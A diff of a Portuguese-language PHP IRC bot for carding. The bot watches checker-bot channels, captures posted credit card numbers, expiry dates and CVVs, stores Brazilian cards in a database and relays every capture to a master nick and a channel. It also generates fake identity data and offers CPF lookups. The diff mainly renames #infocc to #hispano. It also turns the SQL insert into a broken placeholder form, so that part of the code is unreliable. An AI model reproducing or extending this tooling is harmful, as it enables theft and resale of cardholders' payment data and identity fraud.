@@ -66,7 +66,7 @@ function captureBR($ccnr,$ccmes,$ccano,$cccvv,$ccbanco,$ccnivel,$cctipo,$ccbande
     if($mysqli->connect_error){
         echo "Desconectado! Erro: " . $mysqli->connect_error . "\n";
     }else{
-        $inserir = $mysqli->query("INSERT INTO ccbrazil (cc_numero, cc_mes, cc_ano, cc_cvv, cc_banco, cc_nivel, cc_tipo, cc_bandeira, cc_nick) VALUES ('$ccnr', '$ccmes', '$ccano', '$cccvv', '$ccbanco', '$ccnivel', '$cctipo', '$ccbandeira', '$ccnick')");
+        $inserir = $mysqli->query("INSERT INTO `ccbrazil`(`id`, `cc_numero`, `cc_mes`, `cc_ano`, `cc_cvv`, `cc_banco`, `cc_nivel`, `cc_tipo`, `cc_bandeira`, `cc_nick`) VALUES ([value-1],[$ccnr],[$ccmes],[$ccano],[$cccvv],[$ccbanco],[$ccnivel],[$cctipo],[$ccbandeira],[$ccnick])");
         if(!$inserir){ echo 'Erro: ', $inserir->error . "\n"; }
     }
     mysqli_close($mysqli);
@@ -115,7 +115,7 @@ function VerificaCliente($nickirc, $identd, $hostirc){
 	if ($result->num_rows == 1) {
 		$info = $result->fetch_array(MYSQLI_BOTH);
 		if ($identd == $info["user_identd"] && $hostirc == $info["user_hostname"]) {
-			fputs($GLOBALS['socket'], "MODE #INFOCC +v ".$nickirc."\n");
+			fputs($GLOBALS['socket'], "MODE #hispano +v ".$nickirc."\n");
 			return true;
 		} else { return false; }
 	} else { return false; }
@@ -186,7 +186,7 @@ while(1) {
 		// autoJOIN
 		if($ex[0] == ":NickServ!services@services.chknet" && $ex[4] == "accepted") {
                         fputs($socket,"JOIN #brazil\n");
-                        fputs($socket,"JOIN #infocc\n");
+                        fputs($socket,"JOIN #hispano\n");
 			fputs($socket,"JOIN #jcheck\n");
                         fputs($socket,"JOIN #alternative\n");
                         fputs($socket,"JOIN #payment\n");
@@ -216,7 +216,7 @@ while(1) {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
 				}
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
 			}
 		}
 		// JMerchant #jcheck
@@ -239,7 +239,7 @@ while(1) {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"JMerchant");
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
 				}
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
 			}
 		}
 		// DjRogerinhoBOT #alternative
@@ -262,7 +262,7 @@ while(1) {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"DjRogerinhoBOT");
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO."\n");
 					}
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO."\n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO."\n");
 
 			}
 		}
@@ -289,7 +289,7 @@ while(1) {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"B4nk");
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
 					}
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [B4nk] [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [B4nk] [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
 			}
 		}
 		// ChkNet #unix
@@ -309,7 +309,7 @@ while(1) {
 				$jsonBRAND = $dadosBIN[9];
 				$jsonNAME = convertCountry($dadosBIN[6]);
 				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #unix \n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #unix \n");
 				if($jsonNAME == "BRAZIL") {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #unix \n");
@@ -332,7 +332,7 @@ while(1) {
 				$jsonBRAND = $dadosBIN[9];
 				$jsonNAME = convertCountry($dadosBIN[6]);
 				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
 				if($jsonNAME == "BRAZIL") {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
@@ -359,7 +359,7 @@ while(1) {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #check \n");
 					}
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #check \n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #check \n");
 			}
 		}
 		// OwnChk #unix and #payment
@@ -382,7 +382,7 @@ while(1) {
 					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
 					fputs($socket, "PRIVMSG $master :[CAPTURE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
 					}
-				fputs($socket, "PRIVMSG #infocc :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
+				fputs($socket, "PRIVMSG #hispano :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
 			}
 		}
 		// COMANDOS ADMIN
@@ -453,83 +453,83 @@ while(1) {
 				fputs($socket, "PRIVMSG $nickCMD :!disableCheckGGBB - Desativa Checker GERADAS Banco do Brasil!\n");
 				fputs($socket, "PRIVMSG $nickCMD :!disableCheckELO - Desativa Checker GERADAS ELO\n");
 				fputs($socket, "PRIVMSG $nickCMD :!disableCheckFULL - Desativa Checker FULL\n");
-				fputs($socket, "PRIVMSG $nickCMD :!disableAutoVoice - Desativa AutoVoice no #INFOCC\n");
+				fputs($socket, "PRIVMSG $nickCMD :!disableAutoVoice - Desativa AutoVoice no #HISPANO\n");
 				fputs($socket, "PRIVMSG $nickCMD :!disableCADSUS - Desativa consulta NOME/CPF\n");
 				fputs($socket, "PRIVMSG $nickCMD :!disableGuestJOIN - Desativa banimento de Guest\n");
 				fputs($socket, "PRIVMSG $nickCMD :!disableGuestCHANGE - Desativa banimento de mudança de nick para Guest\n");
 				fputs($socket, "PRIVMSG $nickCMD :!enableCheckGGBB - Ativa Checker GERADAS Banco do Brasil\n");
 				fputs($socket, "PRIVMSG $nickCMD :!enableCheckELO - Ativa Checker GERADAS ELO\n");
 				fputs($socket, "PRIVMSG $nickCMD :!enableCheckFULL - Ativa Checker FULL\n");
-				fputs($socket, "PRIVMSG $nickCMD :!enableAutoVoice - Ativa AutoVoice no #INFOCC\n");
+				fputs($socket, "PRIVMSG $nickCMD :!enableAutoVoice - Ativa AutoVoice no #HISPANO\n");
 				fputs($socket, "PRIVMSG $nickCMD :!enableCADSUS - Ativa consulta NOME/CPF\n");
 				fputs($socket, "PRIVMSG $nickCMD :!enableGuestJOIN - Ativa banimento de Guest\n");
 				fputs($socket, "PRIVMSG $nickCMD :!enableGuestCHANGE - Ativa banimento de mudança de nick para Guest\n");
 			        break;
 			    case disableCheckELO:
 				$checkerGGELO = false;
-				fputs($socket, "PRIVMSG #infocc :[4DESABILITADO] Checker de GERADAS ELO!\n");
+				fputs($socket, "PRIVMSG #hispano :[4DESABILITADO] Checker de GERADAS ELO!\n");
 			        break;
 			    case enableCheckELO:
 				$checkerGGELO = true;
-				fputs($socket, "PRIVMSG #infocc :[3HABILITADO] Checker de GERADAS ELO!\n");
+				fputs($socket, "PRIVMSG #hispano :[3HABILITADO] Checker de GERADAS ELO!\n");
 			        break;
 			    case disableAutoVoice:
 				$autovoice = false;
-				fputs($socket, "PRIVMSG #infocc :[4DESABILITADO] Auto Voice no BRONX!\n");
+				fputs($socket, "PRIVMSG #hispano :[4DESABILITADO] Auto Voice no HISPANO!\n");
 			        break;
 			    case enableAutoVoice:
 				$autovoice = true;
-				fputs($socket, "PRIVMSG #infocc :[3HABILITADO] Auto Voice no BRONX!\n");
+				fputs($socket, "PRIVMSG #hispano :[3HABILITADO] Auto Voice no HISPANO!\n");
 			        break;
 			    case disableCheckGGBB:
 				$checkerGGBB = false;
-				fputs($socket, "PRIVMSG #infocc :[4DESABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
+				fputs($socket, "PRIVMSG #hispano :[4DESABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
 			        break;
 			    case disableCheckFULL:
 				$checkerFULL = false;
-				fputs($socket, "PRIVMSG #infocc :[4DESABILITADO] Checker de FULL!\n");
+				fputs($socket, "PRIVMSG #hispano :[4DESABILITADO] Checker de FULL!\n");
 			        break;
 			    case disableCADSUS:
 				$consultaCADSUS = false;
-				fputs($socket, "PRIVMSG #infocc :[4DESABILITADO] Consulta NOME/CPF!\n");
+				fputs($socket, "PRIVMSG #hispano :[4DESABILITADO] Consulta NOME/CPF!\n");
 			        break;
 			    case disableGuestJOIN:
 				$nickGuestJOIN = false;
-				fputs($socket, "PRIVMSG #infocc :[4DESABILITADO] Banimento automático de Guest/AndroUser!\n");
+				fputs($socket, "PRIVMSG #hispano :[4DESABILITADO] Banimento automático de Guest/AndroUser!\n");
 			        break;
 			    case disableGuestCHANGE:
 				$nickGuestCHANGE = false;
-				fputs($socket, "PRIVMSG #infocc :[4DESABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
+				fputs($socket, "PRIVMSG #hispano :[4DESABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
 			        break;
 			    case enableGuestJOIN:
 				$nickGuestJOIN = true;
-				fputs($socket, "PRIVMSG #infocc :[3HABILITADO] Banimento automático de Guest/AndroUser!\n");
+				fputs($socket, "PRIVMSG #hispano :[3HABILITADO] Banimento automático de Guest/AndroUser!\n");
 			        break;
 			    case enableGuestCHANGE:
 				$nickGuestCHANGE = true;
-				fputs($socket, "PRIVMSG #infocc :[3HABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
+				fputs($socket, "PRIVMSG #hispano :[3HABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
 			        break;
 			    case enableCheckGGBB:
 				$checkerGGBB = true;
-				fputs($socket, "PRIVMSG #infocc :[3HABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
+				fputs($socket, "PRIVMSG #hispano :[3HABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
 			        break;
 			    case enableCheckFULL:
 				$checkerFULL = true;
-				fputs($socket, "PRIVMSG #infocc :[3HABILITADO] Checker de FULL!\n");
+				fputs($socket, "PRIVMSG #hispano :[3HABILITADO] Checker de FULL!\n");
 			        break;
 			    case enableCADSUS:
 				$consultaCADSUS = true;
-				fputs($socket, "PRIVMSG #infocc :[3HABILITADO] Consulta NOME/CPF!\n");
+				fputs($socket, "PRIVMSG #hispano :[3HABILITADO] Consulta NOME/CPF!\n");
 			        break;
 			    case ban:
 				$toBan = preg_replace('/\s+/', '', $ex[4]);
 				if(isset($ex[4]) && $ex[4] != "") {
-					fputs($socket, "MODE #infocc +b $toBan\n");
+					fputs($socket, "MODE #hispano +b $toBan\n");
 				}
 			    case kick:
 				$toKick = preg_replace('/\s+/', '', $ex[4]);
 				if(isset($ex[4]) && $ex[4] != "") {
-					fputs($socket, "KICK #infocc ".$toKick." :KICK REQUEST [$nickCMD]\n");
+					fputs($socket, "KICK #hispano ".$toKick." :KICK REQUEST [$nickCMD]\n");
 				}
 			        break;
 			    case join:
@@ -552,7 +552,7 @@ while(1) {
 			} else { fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] 4USUARIO NÃO AUTORIZADO!\n"); }
 		}
 		// AUTOVOICE PARA MEMBROS NO #BRONX
-		if($ex[1] == "JOIN" && isset($ex[2]) && strpos(strtoupper($ex[2]), '#infocc')){
+		if($ex[1] == "JOIN" && isset($ex[2]) && strpos(strtoupper($ex[2]), '#hispano')){
 			$nicktmp = explode('!', $ex[0]);
 			$hosttmp = explode('@', $nicktmp[1]);
 			$nickCMD = str_replace(":", "", $nicktmp[0]);
@@ -568,8 +568,8 @@ while(1) {
 			$nickCMD = str_replace(":", "", $nicktmp[0]);
 			$chantmp = str_replace(":#", "", $ex[2]);
 			$chanCMD = preg_replace('/\s+/', '', $chantmp);
-			if (strtoupper($chanCMD) == "INFOCC" && $nickCMD != "Norah_C_IV" && $nickCMD != "ChkNet" && $nickCMD != "OwnChk") {
-				fputs($socket, "MODE #infocc +v ".$nickCMD."\n");
+			if (strtoupper($chanCMD) == "HISPANO" && $nickCMD != "Norah_C_IV" && $nickCMD != "ChkNet" && $nickCMD != "OwnChk") {
+				fputs($socket, "MODE #hispano +v ".$nickCMD."\n");
 			}
 		}
 		// AUTOBAN JOIN (Guest & AndroUser)
@@ -581,15 +581,15 @@ while(1) {
 			$chanCMD = preg_replace('/\s+/', '', $chantmp);
 			$eGuest = substr($nickCMD, 0, 5);
 			$eAndroUser = substr($nickCMD, 0, 9);
-			if (strtoupper($chanCMD) == "INFOCC") {
+			if (strtoupper($chanCMD) == "HISPANO") {
 				if ($eGuest == "Guest") {
-					fputs($socket, "KICK #INFOCC ".$nickCMD." :Nick Guest não permitido!\n");
-					fputs($socket, "MODE #INFOCC +b ~t:60:*!*@".$hosttmp[1]."\n");
+					fputs($socket, "KICK #HISPANO ".$nickCMD." :Nick Guest não permitido!\n");
+					fputs($socket, "MODE #HISPANO +b ~t:60:*!*@".$hosttmp[1]."\n");
 
 				}
 				if ($eAndroUser == "AndroUser") {
-					fputs($socket, "KICK #INFOCC ".$nickCMD." :Nick AndroUser não permitido!\n");
-					fputs($socket, "MODE #INFOCC +b ~t:60:*!*@".$hosttmp[1]."\n");
+					fputs($socket, "KICK #HISPANO ".$nickCMD." :Nick AndroUser não permitido!\n");
+					fputs($socket, "MODE #HISPANO +b ~t:60:*!*@".$hosttmp[1]."\n");
 				}
 			}
 		}
@@ -602,9 +602,9 @@ while(1) {
 			$eGuest = substr($newnick, 0, 5);
 			$eAndroUser = substr($newnick, 0, 9);
 			if ($eGuest == "Guest") {
-				fputs($socket, "KICK #INFOCC ".$newnick." :Nick Guest não permitido!\n");
+				fputs($socket, "KICK #HISPANO ".$newnick." :Nick Guest não permitido!\n");
 			} elseif ($eAndroUser == "AndroUser") {
-				fputs($socket, "KICK #INFOCC ".$newnick." :Nick AndroUser não permitido!\n");
+				fputs($socket, "KICK #HISPANO ".$newnick." :Nick AndroUser não permitido!\n");
 			}
 		}
 		// COMANDOS #BRAZIL
@@ -677,17 +677,17 @@ while(1) {
 			$nickCMD = str_replace(":", "", $nicktmp[0]);
 			switch ($comando) {
 			    case 'comandos':
-				fputs($socket, "PRIVMSG $ex[2] :05COMANDOS do Canal 01#INFOCC 02[https://pastecode.xyz/view/raw/5d99e19f]\n");
+				fputs($socket, "PRIVMSG $ex[2] :05COMANDOS do Canal 01#HISPANO 02[CANAL AINDA NAO POSSUI LINKS]\n");
 			        break;
 			    case 'regras':
-				fputs($socket, "PRIVMSG $ex[2] :05REGRAS do Canal 01#INFOCC 02[SEM LINK NESSE MOMENTO]\n");
+				fputs($socket, "PRIVMSG $ex[2] :05REGRAS do Canal 01#HISPANO 02[SEM LINK NESSE MOMENTO]\n");
 			        break;
 			    case 'ajuda':
-				fputs($socket, "PRIVMSG $ex[2] :05AJUDA e PERMISSÕES do Canal 01#INFOCC 02[SEM LINK NESSE MOMENTO]\n");
+				fputs($socket, "PRIVMSG $ex[2] :05AJUDA e PERMISSÕES do Canal 01#HISPANO 02[SEM LINK NESSE MOMENTO]\n");
 			        break;
 			    case 'tempmail':
 				$tempMAIL = geraTempMail();
-				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] [7TEMP-MAIL1.7org1]12 $tempMAIL \n");
+				fputs($socket, "PRIVMSG $ex[2] :[11$nickCMD] [7temp-mail1.7org1]12 $tempMAIL \n");
 			        break;
 			    case 'status':
 				if($checkerGGBB) { $statusGGBB = "3HABILITADO"; } else { $statusGGBB = "4DESABILITADO"; }
@@ -705,34 +705,34 @@ while(1) {
 					$jsonTYPE = $dadosBIN[8];
 					$jsonBRAND = $dadosBIN[9];
 					$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
-					fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [BIN] $tempBIN [BANDEIRA] $jsonSCHEME [PAÍS] $jsonNAME [BANCO] $binBANCO [TIPO] $jsonTYPE [CATEGORIA] $jsonBRAND \n");
+					fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [BIN] $tempBIN [BANDEIRA] $jsonSCHEME [PAÍS] $jsonNAME [BANCO] $binBANCO [TIPO] $jsonTYPE [CATEGORIA] $jsonBRAND \n");
 				} elseif (strlen($ex[4]) < 6) {
-					fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
+					fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
 				} else {
-					fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
+					fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
 				}
 			        break;
 			    case 'ip':
 				$meuIP = pegaIp();
-				fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [IP] $meuIP \n");
+				fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [IP] $meuIP \n");
 			        break;
 			    case 'version':
-			        fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → CheckNet [VERSÃO] $version (BETA) updated [$release]\n");
+			        fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → CheckNet [VERSÃO] $version (BETA) updated [$release]\n");
 			        break;
 			    case 'dados':
 				$dados = json_decode(GeraPessoa());
-			        fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
+			        fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
 			        break;
 			    case 'uname':
                                 if($nickCMD == $master) {
-                                        fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [SHELL] $CPUdistro \n");
-                                } else { fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] USUARIO NÃO RECONHECIDO! \n"); }
+                                        fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [SHELL] $CPUdistro \n");
+                                } else { fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] USUARIO NÃO RECONHECIDO! \n"); }
                                 break;
 			    case 'uptime':
                                 if($nickCMD == $master) {
 					$SYSuptime = Uptime();
-                                        fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [UPTIME] $SYSuptime \n");
-                                } else { fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] 4USUARIO NÃO RECONHECIDO! \n"); }
+                                        fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [UPTIME] $SYSuptime \n");
+                                } else { fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] 4USUARIO NÃO RECONHECIDO! \n"); }
                                 break;
 			    case 'lookup':
 				if ($comando == "lookup") {
@@ -745,8 +745,8 @@ while(1) {
 					$isp = getStr($lookup, 'ISP:</th><td>', '</td>');
 					$asnumber = getStr($lookup, 'AS Number:</th><td>', '</td>');
 					$iphostname = str_replace("<td class='tracking'>", '', getStr($lookup, 'Hostname:</th> ', '</td><'));
-                                        fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
-                                } else { fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → Insira o IP para consulta ( Exemplo: !lookup 191.189.23.192 )\n"); } }
+                                        fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
+                                } else { fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → Insira o IP para consulta ( Exemplo: !lookup 191.189.23.192 )\n"); } }
                                 break;
 			    case 'sro':
 				$codRastreio = preg_replace('/\s+/', '', $ex[4]);
@@ -755,8 +755,8 @@ while(1) {
 					$sroACAO = $codObjeto[0]['acao'];
 					$sroDATA = $codObjeto[0]['dia']." - ".$codObjeto[0]['hora'];
 					$sroLOCAL = $codObjeto[0]['local'];
-                                        fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → [RASTREIO] ".preg_replace('/\s+/', '', $ex[4])." [STATUS] $sroACAO [LOCAL] $sroLOCAL [DATA/HORA] $sroDATA \n");
-                                } else { fputs($socket, "PRIVMSG #INFOCC :[11$nickCMD] → Insira o CODIGO DE RASTREIO para consulta ( Exemplo: !sro PT113178279BR )\n"); }
+                                        fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → [RASTREIO] ".preg_replace('/\s+/', '', $ex[4])." [STATUS] $sroACAO [LOCAL] $sroLOCAL [DATA/HORA] $sroDATA \n");
+                                } else { fputs($socket, "PRIVMSG #HISPANO :[11$nickCMD] → Insira o CODIGO DE RASTREIO para consulta ( Exemplo: !sro PT113178279BR )\n"); }
                                 break;
 			}
 		}
